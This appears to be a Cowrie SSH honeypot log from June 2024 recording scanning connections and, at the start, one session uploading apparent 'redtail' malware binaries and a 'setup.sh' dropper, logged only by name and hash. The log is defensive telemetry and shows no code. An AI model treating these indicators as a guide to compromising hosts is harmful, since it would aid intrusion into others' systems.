+2024-06-07T07:54:00.850748Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 1
+2024-06-07T07:54:01.156387Z [cowrie.ssh.session.HoneyPotSSHSession#info] remote close
+2024-06-07T07:54:01.156801Z [HoneyPotSSHTransport,79,164.215.103.47] Saved redir contents with SHA-256 8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b to var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b
+2024-06-07T07:54:01.157492Z [HoneyPotSSHTransport,79,164.215.103.47] Closing TTY Log: var/lib/cowrie/tty/9e9b70dbc5e283e2d4f8bcdfb03edb8710aa71e07d5812d43adca812648ed266 after 0 seconds
+2024-06-07T07:54:01.162091Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP Uploaded file "redtail.arm7" to var/lib/cowrie/downloads/a843ac9c087f399fbf8ef10fec872a732c9cf97c2cd249566a6133a2cebdc0c1
+2024-06-07T07:54:01.167052Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP Uploaded file "redtail.arm8" to var/lib/cowrie/downloads/88dc89bf303026c3ea273d879148e308a503cb211538f4cc47b667cf9f43bebb
+2024-06-07T07:54:01.173721Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP Uploaded file "redtail.i686" to var/lib/cowrie/downloads/8fc5d13238daba3a4986d674ad885f81850c67000c7f4f57df707f5d810ad241
+2024-06-07T07:54:01.180269Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP Uploaded file "redtail.x86_64" to var/lib/cowrie/downloads/19a06de9a8b66196fa6cc9e86824dee577e462cbeaf36d715c8fea5bcb08b54d
+2024-06-07T07:54:01.180953Z [HoneyPotSSHTransport,79,164.215.103.47] SFTP Uploaded file "setup.sh" to var/lib/cowrie/downloads/5ffdf7536899526ec78197a286399f011f4723f814412d097aa65d76072f1b65
+2024-06-07T07:54:01.181537Z [HoneyPotSSHTransport,79,164.215.103.47] avatar root logging out
+2024-06-07T07:54:01.181642Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T07:54:01.181726Z [HoneyPotSSHTransport,79,164.215.103.47] Connection lost after 60 seconds
+2024-06-07T08:28:54.242896Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 64.62.156.81:28083 (172.31.41.134:2222) [session: b071bb6a913d]
+2024-06-07T08:28:54.243660Z [HoneyPotSSHTransport,80,64.62.156.81] Remote SSH version: SSH-2.0-Go
+2024-06-07T08:28:54.390544Z [HoneyPotSSHTransport,80,64.62.156.81] SSH client hassh fingerprint: 7216c7c473918b4f83d1139b3c70dbf9
+2024-06-07T08:28:54.391804Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T08:28:54.391914Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T08:28:54.392006Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T08:28:54.536508Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T08:28:54.536914Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T08:28:54.680425Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'' trying auth b'none'
+2024-06-07T08:28:58.242855Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T08:28:58.243078Z [HoneyPotSSHTransport,80,64.62.156.81] Connection lost after 3 seconds
+2024-06-07T09:03:16.022625Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 183.48.35.110:50832 (172.31.41.134:2222) [session: f5df084b0eca]
+2024-06-07T09:03:16.255575Z [HoneyPotSSHTransport,81,183.48.35.110] Remote SSH version: SSH-2.0-libssh-0.5.2
+2024-06-07T09:03:16.503425Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T09:03:16.503627Z [HoneyPotSSHTransport,81,183.48.35.110] Connection lost after 0 seconds
+2024-06-07T09:18:15.305177Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 205.210.31.169:54307 (172.31.41.134:2222) [session: 629e3430915a]
+2024-06-07T09:18:15.756307Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T09:18:15.756505Z [HoneyPotSSHTransport,82,205.210.31.169] Connection lost after 0 seconds
+2024-06-07T09:24:22.277085Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 174.138.46.89:53264 (172.31.41.134:2222) [session: 86199a5e0f8b]
+2024-06-07T09:24:22.495841Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T09:24:22.496038Z [HoneyPotSSHTransport,83,174.138.46.89] Connection lost after 0 seconds
+2024-06-07T11:50:15.962338Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:33724 (172.31.41.134:2222) [session: 0338ed19b55b]
+2024-06-07T11:50:22.257276Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:50:22.257479Z [HoneyPotSSHTransport,84,120.82.67.15] Connection lost after 6 seconds
+2024-06-07T11:50:22.400291Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:35328 (172.31.41.134:2222) [session: 96a35bc41e43]
+2024-06-07T11:50:28.385853Z [HoneyPotSSHTransport,85,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:50:28.391403Z [HoneyPotSSHTransport,85,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:50:28.392369Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:50:28.392477Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:50:28.392567Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:50:44.649681Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:50:44.649892Z [HoneyPotSSHTransport,85,120.82.67.15] Connection lost after 22 seconds
+2024-06-07T11:50:45.459684Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:39802 (172.31.41.134:2222) [session: ce870dc7761f]
+2024-06-07T11:50:51.505310Z [HoneyPotSSHTransport,86,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:50:51.506555Z [HoneyPotSSHTransport,86,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:50:51.507510Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:50:51.507638Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:50:51.507729Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:51:13.121395Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:51:13.121776Z [HoneyPotSSHTransport,86,120.82.67.15] Connection lost after 27 seconds
+2024-06-07T11:51:14.327630Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:43566 (172.31.41.134:2222) [session: c13e0525babf]
+2024-06-07T11:51:19.011237Z [HoneyPotSSHTransport,87,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:51:19.012600Z [HoneyPotSSHTransport,87,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:51:19.013587Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:51:19.013692Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:51:19.013783Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:51:39.098200Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:51:39.098423Z [HoneyPotSSHTransport,87,120.82.67.15] Connection lost after 24 seconds
+2024-06-07T11:51:39.915244Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:48466 (172.31.41.134:2222) [session: 52d84be15622]
+2024-06-07T11:51:45.727668Z [HoneyPotSSHTransport,88,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:51:45.729022Z [HoneyPotSSHTransport,88,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:51:45.729987Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:51:45.730096Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:51:45.730188Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:52:04.182255Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:52:04.182464Z [HoneyPotSSHTransport,88,120.82.67.15] Connection lost after 24 seconds
+2024-06-07T11:52:05.235205Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:52938 (172.31.41.134:2222) [session: 79856a2e91f6]
+2024-06-07T11:52:08.639765Z [HoneyPotSSHTransport,89,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:52:08.640989Z [HoneyPotSSHTransport,89,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:52:08.641960Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:52:08.642085Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:52:08.642173Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:52:35.098081Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:52:35.098295Z [HoneyPotSSHTransport,89,120.82.67.15] Connection lost after 29 seconds
+2024-06-07T11:52:39.405809Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:58592 (172.31.41.134:2222) [session: 93cf3a72ea9e]
+2024-06-07T11:52:42.993064Z [HoneyPotSSHTransport,90,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:52:42.994156Z [HoneyPotSSHTransport,90,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:52:42.995103Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:52:42.995211Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:52:42.995302Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:53:07.889946Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:53:07.890153Z [HoneyPotSSHTransport,90,120.82.67.15] Connection lost after 28 seconds
+2024-06-07T11:53:08.639755Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:35396 (172.31.41.134:2222) [session: 1cad1187d775]
+2024-06-07T11:53:12.388140Z [HoneyPotSSHTransport,91,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:53:12.389511Z [HoneyPotSSHTransport,91,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:53:12.390470Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:53:12.390578Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:53:12.390669Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:53:40.719123Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:53:40.719329Z [HoneyPotSSHTransport,91,120.82.67.15] Connection lost after 32 seconds
+2024-06-07T11:53:42.460575Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:40814 (172.31.41.134:2222) [session: 13c9c21652cd]
+2024-06-07T11:53:46.078314Z [HoneyPotSSHTransport,92,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:53:46.079700Z [HoneyPotSSHTransport,92,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:53:46.080842Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:53:46.080948Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:53:46.081036Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:53:55.598186Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:53:55.598384Z [HoneyPotSSHTransport,92,120.82.67.15] Connection lost after 13 seconds
+2024-06-07T11:53:56.454720Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:43266 (172.31.41.134:2222) [session: a073432cdc1d]
+2024-06-07T11:53:59.396156Z [HoneyPotSSHTransport,93,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:53:59.397498Z [HoneyPotSSHTransport,93,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:53:59.398435Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:53:59.398540Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:53:59.398641Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:54:10.621747Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:54:10.621960Z [HoneyPotSSHTransport,93,120.82.67.15] Connection lost after 14 seconds
+2024-06-07T11:54:11.849762Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:45914 (172.31.41.134:2222) [session: f94d94efb0be]
+2024-06-07T11:54:15.281840Z [HoneyPotSSHTransport,94,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:54:15.283242Z [HoneyPotSSHTransport,94,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:54:15.284194Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:54:15.284313Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:54:15.284405Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:54:35.826571Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:54:35.826768Z [HoneyPotSSHTransport,94,120.82.67.15] Connection lost after 23 seconds
+2024-06-07T11:54:37.386372Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:50738 (172.31.41.134:2222) [session: f6955b8d50de]
+2024-06-07T11:54:40.516973Z [HoneyPotSSHTransport,95,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:54:40.518217Z [HoneyPotSSHTransport,95,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:54:40.519156Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:54:40.519261Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:54:40.519351Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:54:57.964693Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:54:57.964916Z [HoneyPotSSHTransport,95,120.82.67.15] Connection lost after 20 seconds
+2024-06-07T11:54:58.561974Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:53678 (172.31.41.134:2222) [session: 40829c6fc63c]
+2024-06-07T11:55:02.279799Z [HoneyPotSSHTransport,96,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:55:02.282118Z [HoneyPotSSHTransport,96,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:55:02.283109Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:55:02.283226Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:55:02.283330Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:55:20.992169Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:55:20.992372Z [HoneyPotSSHTransport,96,120.82.67.15] Connection lost after 22 seconds
+2024-06-07T11:55:22.586607Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:57374 (172.31.41.134:2222) [session: 9135d847b167]
+2024-06-07T11:55:26.325745Z [HoneyPotSSHTransport,97,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:55:26.328966Z [HoneyPotSSHTransport,97,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:55:26.330041Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:55:26.330144Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:55:26.330232Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:55:43.494491Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:55:43.494695Z [HoneyPotSSHTransport,97,120.82.67.15] Connection lost after 20 seconds
+2024-06-07T11:55:44.359221Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:60776 (172.31.41.134:2222) [session: c520f1da384e]
+2024-06-07T11:55:47.869100Z [HoneyPotSSHTransport,98,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:55:47.871081Z [HoneyPotSSHTransport,98,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:55:47.872208Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:55:47.872315Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:55:47.872414Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:56:05.694002Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:56:05.694218Z [HoneyPotSSHTransport,98,120.82.67.15] Connection lost after 21 seconds
+2024-06-07T11:56:13.092822Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:37724 (172.31.41.134:2222) [session: 9ded1e693596]
+2024-06-07T11:56:19.550477Z [HoneyPotSSHTransport,99,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:56:19.551785Z [HoneyPotSSHTransport,99,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:56:19.552862Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:56:19.552967Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:56:19.553069Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:56:43.837246Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:56:43.837451Z [HoneyPotSSHTransport,99,120.82.67.15] Connection lost after 30 seconds
+2024-06-07T11:56:44.218000Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:42920 (172.31.41.134:2222) [session: b52e32243870]
+2024-06-07T11:56:48.293067Z [HoneyPotSSHTransport,100,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:56:48.294396Z [HoneyPotSSHTransport,100,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:56:48.295337Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:56:48.295467Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:56:48.295556Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:57:08.833497Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:57:08.833711Z [HoneyPotSSHTransport,100,120.82.67.15] Connection lost after 24 seconds
+2024-06-07T11:57:15.111027Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:48122 (172.31.41.134:2222) [session: 95549ebefa78]
+2024-06-07T11:57:19.324795Z [HoneyPotSSHTransport,101,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:57:19.326221Z [HoneyPotSSHTransport,101,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:57:19.327142Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:57:19.327246Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:57:19.327334Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:57:44.662040Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:57:44.662237Z [HoneyPotSSHTransport,101,120.82.67.15] Connection lost after 29 seconds
+2024-06-07T11:57:49.699267Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:53860 (172.31.41.134:2222) [session: f4546ce6aa63]
+2024-06-07T11:57:53.530535Z [HoneyPotSSHTransport,102,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:57:53.532321Z [HoneyPotSSHTransport,102,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:57:53.533344Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:57:53.533449Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:57:53.533536Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:58:12.546496Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:58:12.546751Z [HoneyPotSSHTransport,102,120.82.67.15] Connection lost after 22 seconds
+2024-06-07T11:58:14.323348Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:57248 (172.31.41.134:2222) [session: 302f450d97ab]
+2024-06-07T11:58:23.844218Z [HoneyPotSSHTransport,103,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:58:23.845627Z [HoneyPotSSHTransport,103,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:58:23.846571Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:58:23.846682Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:58:23.846774Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:58:52.593191Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:58:52.593405Z [HoneyPotSSHTransport,103,120.82.67.15] Connection lost after 38 seconds
+2024-06-07T11:58:53.099541Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:35942 (172.31.41.134:2222) [session: 1c190bbb3962]
+2024-06-07T11:58:55.941088Z [HoneyPotSSHTransport,104,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:58:55.942705Z [HoneyPotSSHTransport,104,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:58:55.943794Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:58:55.943902Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:58:55.943992Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:59:17.528836Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:59:17.529054Z [HoneyPotSSHTransport,104,120.82.67.15] Connection lost after 24 seconds
+2024-06-07T11:59:19.128878Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:39498 (172.31.41.134:2222) [session: 40e2885de79e]
+2024-06-07T11:59:26.074161Z [HoneyPotSSHTransport,105,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:59:26.075407Z [HoneyPotSSHTransport,105,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:59:26.076371Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T11:59:26.076475Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:59:26.076563Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:59:52.903722Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T11:59:52.903935Z [HoneyPotSSHTransport,105,120.82.67.15] Connection lost after 33 seconds
+2024-06-07T11:59:55.301133Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:45222 (172.31.41.134:2222) [session: 41100ae38256]
+2024-06-07T11:59:59.706454Z [HoneyPotSSHTransport,106,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T11:59:59.708047Z [HoneyPotSSHTransport,106,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T11:59:59.709028Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
